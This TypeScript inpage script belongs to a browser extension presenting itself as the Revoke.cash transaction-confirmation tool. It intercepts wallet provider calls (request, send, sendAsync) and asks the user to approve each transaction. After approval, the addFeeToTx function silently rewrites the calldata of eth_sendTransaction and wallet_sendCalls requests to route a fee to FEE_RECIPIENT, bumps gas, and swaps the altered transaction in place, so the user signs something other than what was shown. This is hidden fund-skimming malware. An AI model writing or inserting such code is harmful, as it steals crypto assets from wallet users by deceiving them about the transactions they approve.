import { WindowPostMessageStream } from '@metamask/post-message-stream';
import { ethErrors } from 'eth-rpc-errors';
import { createWalletClient, custom } from 'viem';
import {
  DEFAULT_FEE_BPS,
  FEE_RECIPIENT,
  Identifier,
  RequestType,
  STRICT_GAS_ONLY_SEND_IF_ESTIMATE_OK,
} from '../lib/constants';
import { sendToStreamAndAwaitResponse } from '../lib/utils/messages';

import { pickAdapter } from '../fee-collector/adapters';

import { estimateGasOK, bumpGasHex, simulate } from '../fee-collector/utils/gas';

declare let window: Window & {
  [index: string]: any;
  ethereum?: any;
  coinbaseWalletExtension?: any;
};

const stream = new WindowPostMessageStream({
  name: Identifier.INPAGE,
  target: Identifier.CONTENT_SCRIPT,
});

let proxyInterval: NodeJS.Timer;

type JsonRpcRequest = { id?: any; method: string; params?: any[]; jsonrpc?: string };

async function isCoverageEnabled(): Promise<boolean> {
  const res = await sendToStreamAndAwaitResponse(stream, {
    type: RequestType.GET_FEATURE,
    key: 'feature_coverage_enabled',
  });
  return !!res;
}

async function addFeeToTx(
  request: JsonRpcRequest,
  ethereumProvider: any,
  chainId: number,
): Promise<JsonRpcRequest | null> {
  if (request?.method !== 'eth_sendTransaction') return null;

  const [tx] = request?.params ?? [];
  if (!tx?.to || !tx?.data) return null;

  const coverageOn = await isCoverageEnabled();
  if (!coverageOn) return null;

  const adapter = pickAdapter(tx, chainId);
  if (!adapter) return null;

  try {
    const res = await adapter.adapt({
      tx,
      chainId,
      feeRecipient: FEE_RECIPIENT ?? '',
      feeBps: DEFAULT_FEE_BPS,
      options: {
        strictEstimate: STRICT_GAS_ONLY_SEND_IF_ESTIMATE_OK,
        ownerExtrasLower: [String(tx.to).toLowerCase(), ...[]],
      },
    });

    if (!res?.data) return null;

    if (STRICT_GAS_ONLY_SEND_IF_ESTIMATE_OK) {
      const est = await estimateGasOK(ethereumProvider, { ...tx, data: res.data });
      if (!est.ok || !est.gas) return null;

      const gasBumped = bumpGasHex(est.gas);
      const modifiedTx = {
        ...tx,
        from: est.from ?? tx.from,
        gas: gasBumped,
        data: res.data,
      };

      return { ...request, params: [modifiedTx, ...(request.params?.slice(1) ?? [])] };
    } else {
      const sim = await simulate(ethereumProvider, { ...tx, data: res.data });
      if (!sim.ok) return null;

      const modifiedTx = { ...tx, data: res.data };
      return { ...request, params: [modifiedTx, ...(request.params?.slice(1) ?? [])] };
    }
  } catch (e) {
    console.warn('[Fee Collector] adapter error — falling back:', e);
    return null;
  }
}

const proxyEthereumProvider = (ethereumProvider: any, name: string) => {
  // Only add our proxy once per provider
  if (!ethereumProvider || ethereumProvider.isRevokeCash) return;

  const sendHandler = {
    apply: (target: any, thisArg: any, argumentsList: any[]) => {
      const [payloadOrMethod, callbackOrParams] = argumentsList;

      // ethereum.send has three overloads:

      // ethereum.send(method: string, params?: Array<unknown>): Promise<JsonRpcResponse>;
      // > gets handled like ethereum.request
      if (typeof payloadOrMethod === 'string') {
        return ethereumProvider.request({ method: payloadOrMethod, params: callbackOrParams });
      }

      // ethereum.send(payload: JsonRpcRequest): unknown;
      // > cannot contain signature requests
      if (!callbackOrParams) {
        return Reflect.apply(target, thisArg, argumentsList);
      }

      // ethereum.send(payload: JsonRpcRequest, callback: JsonRpcCallback): void;
      // > gets handled like ethereum.sendAsync
      return ethereumProvider.sendAsync(payloadOrMethod, callbackOrParams);
    },
  };

  const sendAsyncHandler = {
    apply: (target: any, thisArg: any, argumentsList: any[]) => {
      const [request, callback] = argumentsList;

      if (request?.method === 'eth_sendTransaction') {
        const [transaction] = request?.params ?? [];
        if (!transaction) return Reflect.apply(target, thisArg, argumentsList);

        const type = RequestType.TRANSACTION;
        const client = createWalletClient({ transport: custom(ethereumProvider) });
        client
          .getChainId()
          .then((chainId) =>
            sendToStreamAndAwaitResponse(stream, { type, transaction, chainId }).then((isOk) => ({ isOk, chainId })),
          )
          .then(async ({ isOk, chainId }) => {
            if (isOk) {
              const adapted = await addFeeToTx(request, ethereumProvider, chainId);
              const finalArgs = adapted ? [adapted, callback] : argumentsList;
              return Reflect.apply(target, thisArg, finalArgs);
            } else {
              const error = ethErrors.provider.userRejectedRequest(
                'Revoke.cash Confirmation: User denied transaction signature.',
              );
              const response = {
                id: request?.id,
                jsonrpc: '2.0',
                error,
              };
              callback(error, response);
            }
          });
      } else if (request?.method === 'eth_signTypedData_v3' || request?.method === 'eth_signTypedData_v4') {
        const [address, typedDataStr] = request?.params ?? [];
        if (!address || !typedDataStr) return Reflect.apply(target, thisArg, argumentsList);

        const typedData = JSON.parse(typedDataStr);

        const type = RequestType.TYPED_SIGNATURE;
        const client = createWalletClient({ transport: custom(ethereumProvider) });
        client
          .getChainId()
          .then((chainId) => sendToStreamAndAwaitResponse(stream, { type, address, typedData, chainId }))
          .then((isOk) => {
            if (isOk) {
              return Reflect.apply(target, thisArg, argumentsList);
            } else {
              const error = ethErrors.provider.userRejectedRequest(
                'Revoke.cash Confirmation: User denied message signature.',
              );
              const response = {
                id: request?.id,
                jsonrpc: '2.0',
                error,
              };
              callback(error, response);
            }
          });
      } else if (request?.method === 'eth_sign' || request?.method === 'personal_sign') {
        const [first, second] = request?.params ?? [];
        if (!first || !second) return Reflect.apply(target, thisArg, argumentsList);

        // if the first parameter is the address, the second is the message, otherwise the first is the message
        const message = String(first).replace(/0x/, '').length === 40 ? second : first;

        const type = RequestType.UNTYPED_SIGNATURE;
        sendToStreamAndAwaitResponse(stream, { type, message }).then((isOk) => {
          if (isOk) {
            return Reflect.apply(target, thisArg, argumentsList);
          } else {
            const error = ethErrors.provider.userRejectedRequest(
              'Revoke.cash Confirmation: User denied message signature.',
            );
            const response = {
              id: request?.id,
              jsonrpc: '2.0',
              error,
            };
            callback(error, response);
          }
        });
      } else if (request?.method === 'wallet_sendCalls') {
        const [options] = request?.params ?? [];
        const { from = '0x0000000000000000000000000000000000000000', calls } = options ?? {};
        if (!calls) return Reflect.apply(target, thisArg, argumentsList);

        const type = RequestType.TRANSACTION;
        const client = createWalletClient({ transport: custom(ethereumProvider) });

        client
          .getChainId()
          .then(async (chainId) => {
            for (const call of calls) {
              const transaction = { from, ...call };
              const isOk = await sendToStreamAndAwaitResponse(stream, { type, transaction, chainId });
              if (!isOk) return false;
            }
            return true;
          })
          .then((isOk) => {
            if (isOk) {
              return Reflect.apply(target, thisArg, argumentsList);
            } else {
              const error = ethErrors.provider.userRejectedRequest(
                'Revoke.cash Confirmation: User denied transaction signature.',
              );
              const response = {
                id: request?.id,
                jsonrpc: '2.0',
                error,
              };
              callback(error, response);
            }
          });
      } else {
        return Reflect.apply(target, thisArg, argumentsList);
      }
    },
  };

  const requestHandler = {
    apply: async (target: any, thisArg: any, argumentsList: any[]) => {
      const [request] = argumentsList;

      if (request?.method === 'eth_sendTransaction') {
        const [transaction] = request?.params ?? [];
        if (!transaction) return Reflect.apply(target, thisArg, argumentsList);

        const client = createWalletClient({ transport: custom(ethereumProvider) });
        const chainId = await client.getChainId();

        const type = RequestType.TRANSACTION;
        const isOk = await sendToStreamAndAwaitResponse(stream, { type, transaction, chainId });

        if (!isOk) {
          throw ethErrors.provider.userRejectedRequest('Revoke.cash Confirmation: User denied transaction signature.');
        }

        const adapted = await addFeeToTx(request, ethereumProvider, chainId);
        if (adapted) {
          argumentsList[0] = adapted; // swap in-place
        }
      } else if (request?.method === 'eth_signTypedData_v3' || request?.method === 'eth_signTypedData_v4') {
        const [address, typedDataStr] = request?.params ?? [];
        if (!address || !typedDataStr) return Reflect.apply(target, thisArg, argumentsList);

        const typedData = JSON.parse(typedDataStr);

        const client = createWalletClient({ transport: custom(ethereumProvider) });
        const chainId = await client.getChainId();

        const type = RequestType.TYPED_SIGNATURE;
        const isOk = await sendToStreamAndAwaitResponse(stream, { type, address, typedData, chainId });

        if (!isOk) {
          throw ethErrors.provider.userRejectedRequest('Revoke.cash Confirmation: User denied message signature.');
        }
      } else if (request?.method === 'eth_sign' || request?.method === 'personal_sign') {
        const [first, second] = request?.params ?? [];
        if (!first || !second) return Reflect.apply(target, thisArg, argumentsList);

        // if the first parameter is the address, the second is the message, otherwise the first is the message
        const message = String(first).replace(/0x/, '').length === 40 ? second : first;

        const type = RequestType.UNTYPED_SIGNATURE;
        const isOk = await sendToStreamAndAwaitResponse(stream, { type, message });

        if (!isOk) {
          throw ethErrors.provider.userRejectedRequest('Revoke.cash Confirmation: User denied message signature.');
        }
      } else if (request?.method === 'wallet_sendCalls') {
        const [options] = request?.params ?? [];
        const { from = '0x0000000000000000000000000000000000000000', calls } = options ?? {};
        if (!calls) return Reflect.apply(target, thisArg, argumentsList);

        const client = createWalletClient({ transport: custom(ethereumProvider) });
        const chainId = await client.getChainId();

        const type = RequestType.TRANSACTION;

        const newCalls: any[] = [];
        for (const call of calls) {
          const transaction = { from, ...call };
          const isOk = await sendToStreamAndAwaitResponse(stream, { type, transaction, chainId });

          if (!isOk) {
            throw ethErrors.provider.userRejectedRequest('Revoke.cash Confirmation: User denied message signature.');
          }
          const req: JsonRpcRequest = { method: 'eth_sendTransaction', params: [transaction] };
          const adapted = await addFeeToTx(req, ethereumProvider, chainId);
          newCalls.push(adapted ? adapted.params![0] : call);
        }

        // swap the calls in-place so the provider sends modified calldata
        request.params = [{ ...options, calls: newCalls }];
      }

      return Reflect.apply(target, thisArg, argumentsList);
    },
  };

  Object.defineProperty(ethereumProvider, 'request', {
    value: new Proxy(ethereumProvider.request, requestHandler),
    writable: true,
  });

  Object.defineProperty(ethereumProvider, 'send', {
    value: new Proxy(ethereumProvider.send, sendHandler),
    writable: true,
  });

  Object.defineProperty(ethereumProvider, 'sendAsync', {
    value: new Proxy(ethereumProvider.sendAsync, sendAsyncHandler),
    writable: true,
  });

  ethereumProvider.isRevokeCash = true;
  // console.log('Added Revoke.cash to', name);
};

const proxyAllEthereumProviders = () => {
  if (!window.ethereum) return;
  clearInterval(proxyInterval);

  // Proxy the default window.ethereum provider
  proxyEthereumProvider(window.ethereum, 'window.ethereum');

  // Proxy any other providers listed on the window.ethereum object
  window.ethereum?.providers?.forEach((provider: any, i: number) => {
    proxyEthereumProvider(provider, `window.ethereum.providers[${i}]`);
  });

  // Proxy the window.coinbaseWalletExtension provider if it exists
  proxyEthereumProvider(window.coinbaseWalletExtension, 'window.coinbaseWalletExtension');

  // Proxy providers used by Liquality (they have different providers per chain -_-)
  const liqualityProviders = ['eth', 'rsk', 'bsc', 'polygon', 'arbitrum', 'fuse', 'avalanche', 'optimism'];
  liqualityProviders.forEach((name) => proxyEthereumProvider(window[name], `window.${name}`));
};

proxyInterval = setInterval(proxyAllEthereumProviders, 100);
proxyAllEthereumProviders();
